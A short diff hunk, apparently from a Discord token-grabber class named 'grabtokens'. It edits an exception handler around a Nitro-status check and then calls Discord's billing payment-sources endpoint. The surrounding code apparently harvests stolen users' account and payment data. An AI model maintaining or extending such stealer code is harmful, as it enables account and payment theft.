@@ -223,7 +223,7 @@ class grabtokens():
                     nitro = 'Nitro Classic'
                 elif r.json()['premium_type'] == 2:
                     nitro = 'Nitro Boost'
-            except IndexError or KeyError or TypeError:
+            except KeyError :
                 nitro = 'None'
 
             b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
